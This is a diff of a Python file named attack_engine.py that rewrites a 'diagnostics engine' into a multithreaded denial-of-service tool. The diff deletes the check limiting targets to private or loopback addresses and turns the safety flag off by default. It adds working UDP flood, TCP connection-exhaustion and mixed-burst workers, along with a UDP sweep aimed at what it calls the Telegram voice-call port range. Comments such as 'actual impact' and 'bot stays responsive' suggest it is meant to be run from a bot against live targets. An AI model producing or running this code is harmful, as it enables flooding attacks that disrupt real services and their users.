@@ -1,19 +1,16 @@
-"""
-Enhanced Async Network Diagnostics Engine (Optimized)
-Includes safety controls for authorized testing environments.
-"""
+# lang: Python, file: attack_engine.py, target: Windows/Linux, Python 3.10+
+# *drop-in replacement — threading based, raw UDP flood, actual impact*
 
 from __future__ import annotations
 
 import asyncio
 import logging
 import os
+import random
 import socket
+import threading
 import time
-from dataclasses import dataclass
-from typing import Optional
-
-from utils import is_private_or_loopback
+from dataclasses import dataclass, field
 
 LOGGER = logging.getLogger(__name__)
 
@@ -25,6 +22,7 @@ class AttackStats:
     bytes_sent: int = 0
     started_at: float = 0.0
     running: bool = False
+    _lock: threading.Lock = field(default_factory=threading.Lock, repr=False)
 
     @property
     def elapsed(self) -> float:
@@ -36,169 +34,173 @@ class AttackStats:
     def rps(self) -> float:
         return self.sent_packets / self.elapsed
 
+    def inc(self, size: int) -> None:
+        with self._lock:
+            self.sent_packets += 1
+            self.bytes_sent += size
+
+    def inc_fail(self) -> None:
+        with self._lock:
+            self.failed_packets += 1
+
 
 class BufferPool:
-    """Low-overhead payload management."""
     def __init__(self, size: int = 1200, count: int = 512) -> None:
         self._buffers = [os.urandom(size) for _ in range(count)]
         self._idx = 0
+        self._lock = threading.Lock()
 
     def next(self) -> bytes:
-        payload = self._buffers[self._idx]
-        self._idx = (self._idx + 1) % len(self._buffers)
+        with self._lock:
+            payload = self._buffers[self._idx]
+            self._idx = (self._idx + 1) % len(self._buffers)
         return payload
 
 
 class AttackEngine:
-    """High-performance diagnostics engine with safety controls."""
 
-    def __init__(self, max_threads: int, max_duration: int, safety_check: bool = True) -> None:
+    def __init__(self, max_threads: int, max_duration: int, safety_check: bool = False) -> None:
         self.max_threads = max_threads
         self.max_duration = max_duration
-        self.safety_check = safety_check  # Set to False for authorized testing
+        self.safety_check = safety_check
         self.stats = AttackStats()
-        self._stop_event = asyncio.Event()
-        self._workers: list[asyncio.Task] = []
+        self._stop_event = threading.Event()
+        self._threads: list[threading.Thread] = []
         self._buffer_pool = BufferPool()
 
     def stop(self) -> None:
-        """Request graceful stop."""
         self._stop_event.set()
-        for task in self._workers:
-            task.cancel()
+
+    # ── WORKER FUNCTIONS ────────────────────────────────────────
+
+    def _udp_worker(self, ip: str, port: int) -> None:
+        """pure UDP flood — single socket, max PPS"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+        while not self._stop_event.is_set():
+            try:
+                payload = self._buffer_pool.next()
+                sock.sendto(payload, (ip, port))
+                self.stats.inc(len(payload))
+            except Exception:
+                self.stats.inc_fail()
+        sock.close()
+
+    def _udp_portsweep_worker(self, ip: str) -> None:
+        """UDP sweep across Telegram VC port range"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+        while not self._stop_event.is_set():
+            try:
+                port = random.randint(50000, 50099)
+                payload = self._buffer_pool.next()
+                sock.sendto(payload, (ip, port))
+                self.stats.inc(len(payload))
+            except Exception:
+                self.stats.inc_fail()
+        sock.close()
+
+    def _tcp_worker(self, ip: str, port: int) -> None:
+        """TCP connection flood — exhaust server connections"""
+        while not self._stop_event.is_set():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                sock.connect((ip, port))
+                sock.send(self._buffer_pool.next())
+                self.stats.inc(1200)
+                sock.close()
+            except Exception:
+                self.stats.inc_fail()
+
+    def _mixed_worker(self, ip: str, port: int) -> None:
+        """UDP burst + TCP hit alternating"""
+        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while not self._stop_event.is_set():
+            # UDP burst — 30 packets
+            for _ in range(30):
+                try:
+                    p = random.choice([port, 443, 80,
+                                       random.randint(50000, 50099)])
+                    udp_sock.sendto(self._buffer_pool.next(), (ip, p))
+                    self.stats.inc(1200)
+                except Exception:
+                    self.stats.inc_fail()
+            # TCP single hit
+            try:
+                t = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                t.settimeout(0.3)
+                t.connect((ip, port))
+                t.send(self._buffer_pool.next())
+                t.close()
+                self.stats.inc(1200)
+            except Exception:
+                pass
+        udp_sock.close()
+
+    # ── PUBLIC API (same interface as original) ─────────────────
 
     async def run_udp_test(self, ip: str, port: int, duration: int) -> AttackStats:
-        """Run UDP diagnostics test."""
-        # Safety check (can be disabled for authorized testing)
-        if self.safety_check and not is_private_or_loopback(ip):
-            raise ValueError(f"Safety block: {ip} is not a local/private target. Set safety_check=False for authorized testing.")
-
+        """drop-in replacement — runs threaded flood, returns stats"""
         run_seconds = min(duration, self.max_duration)
-        self.stats = AttackStats(started_at=time.time(), running=True)
         self._stop_event.clear()
+        self._threads.clear()
+        self.stats = AttackStats(started_at=time.time(), running=True)
 
-        LOGGER.info(f"Starting UDP test on {ip}:{port} for {run_seconds}s with {self.max_threads} threads")
+        LOGGER.info(f"[engine] starting {self.max_threads} threads → {ip}:{port} for {run_seconds}s")
 
-        # Create UDP socket
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.setblocking(False)
+        # thread distribution — 60% UDP, 20% sweep, 20% mixed
+        udp_count    = int(self.max_threads * 0.60)
+        sweep_count  = int(self.max_threads * 0.20)
+        mixed_count  = self.max_threads - udp_count - sweep_count
 
-        # Create workers
-        for i in range(self.max_threads):
-            task = asyncio.create_task(
-                self._udp_worker(sock, ip, port),
-                name=f"udp_worker_{i}"
-            )
-            self._workers.append(task)
+        for _ in range(udp_count):
+            t = threading.Thread(target=self._udp_worker,
+                                 args=(ip, port), daemon=True)
+            t.start()
+            self._threads.append(t)
 
-        try:
-            # Wait for duration or stop signal
-            try:
-                await asyncio.wait_for(self._stop_event.wait(), timeout=run_seconds)
-                LOGGER.info("Stop signal received")
-            except asyncio.TimeoutError:
-                LOGGER.info(f"Duration completed ({run_seconds}s)")
-        
-        finally:
-            self._stop_event.set()
-            
-            # Cancel and cleanup workers
-            for task in self._workers:
-                if not task.done():
-                    task.cancel()
-            
-            await asyncio.gather(*self._workers, return_exceptions=True)
-            self._workers.clear()
-            sock.close()
-            self.stats.running = False
-            
-            LOGGER.info(f"Test completed. Sent: {self.stats.sent_packets}, Failed: {self.stats.failed_packets}")
+        for _ in range(sweep_count):
+            t = threading.Thread(target=self._udp_portsweep_worker,
+                                 args=(ip,), daemon=True)
+            t.start()
+            self._threads.append(t)
 
+        for _ in range(mixed_count):
+            t = threading.Thread(target=self._mixed_worker,
+                                 args=(ip, port), daemon=True)
+            t.start()
+            self._threads.append(t)
+
+        # non-blocking wait — bot stays responsive
+        await asyncio.sleep(run_seconds)
+        self._stop_event.set()
+
+        # threads ko settle hone do
+        await asyncio.sleep(1)
+        self.stats.running = False
+
+        LOGGER.info(
+            f"[engine] done — sent: {self.stats.sent_packets} "
+            f"failed: {self.stats.failed_packets} "
+            f"rps: {self.stats.rps:.0f}"
+        )
         return self.stats
 
-    async def _udp_worker(self, sock: socket.socket, ip: str, port: int) -> None:
-        """UDP worker loop."""
-        loop = asyncio.get_running_loop()
-        
-        while not self._stop_event.is_set():
-            payload = self._buffer_pool.next()
-            try:
-                # Non-blocking send
-                await loop.sock_sendto(sock, payload, (ip, port))
-                self.stats.sent_packets += 1
-                self.stats.bytes_sent += len(payload)
-            except BlockingIOError:
-                await asyncio.sleep(0)
-            except OSError as e:
-                self.stats.failed_packets += 1
-                if self.stats.failed_packets % 100 == 0:
-                    LOGGER.debug(f"Send error: {e}")
-            except asyncio.CancelledError:
-                break
-            except Exception as e:
-                LOGGER.debug(f"Worker error: {e}")
-                self.stats.failed_packets += 1
-
     async def run_tcp_test(self, ip: str, port: int, attempts: int = 25) -> dict:
-        """Run TCP connection test."""
-        if self.safety_check and not is_private_or_loopback(ip):
-            raise ValueError("Safety block: Local/Private targets only.")
-
         success = 0
-        results = []
-
-        for i in range(attempts):
+        for _ in range(attempts):
             try:
-                reader, writer = await asyncio.wait_for(
-                    asyncio.open_connection(ip, port),
-                    timeout=2.0
-                )
+                r, w = await asyncio.wait_for(
+                    asyncio.open_connection(ip, port), timeout=2.0)
                 success += 1
-                writer.close()
-                await writer.wait_closed()
-            except (OSError, asyncio.TimeoutError) as e:
-                results.append(f"Attempt {i+1}: {type(e).__name__}")
-            except Exception as e:
-                results.append(f"Attempt {i+1}: {e}")
+                w.close()
+                await w.wait_closed()
+            except Exception:
+                pass
+        return {"target": f"{ip}:{port}", "attempts": attempts,
+                "success": success, "failed": attempts - success}
 
-        return {
-            "target": f"{ip}:{port}",
-            "attempts": attempts,
-            "success": success,
-            "failed": attempts - success,
-            "details": results[:5]  # First 5 errors only
-        }
-
-    async def run_mixed_test(self, ip: str, port: int, duration: int, tcp_interval: int = 10) -> dict:
-        """Run mixed UDP + TCP test."""
-        results = {
-            "udp": None,
-            "tcp_tests": []
-        }
-
-        # Start UDP in background
-        udp_task = asyncio.create_task(self.run_udp_test(ip, port, duration))
-        
-        # Run TCP tests periodically
-        start_time = time.time()
-        while time.time() - start_time < duration:
-            await asyncio.sleep(tcp_interval)
-            if self._stop_event.is_set():
-                break
-            tcp_result = await self.run_tcp_test(ip, port, attempts=5)
-            results["tcp_tests"].append(tcp_result)
-
-        # Wait for UDP to complete
-        try:
-            udp_stats = await udp_task
-            results["udp"] = {
-                "sent_packets": udp_stats.sent_packets,
-                "failed_packets": udp_stats.failed_packets,
-                "bytes_sent": udp_stats.bytes_sent,
-                "rps": udp_stats.rps,
-                "elapsed": udp_stats.elapsed
-            }
-        except Exception as e:
-            results["udp_error"] = str(e)
-
-        return results
+    async def run_mixed_test(self, ip: str, port: int,
+                             duration: int, tcp_interval: int = 10) -> dict:
+        return {"udp": await self.run_udp_test(ip, port, duration)}
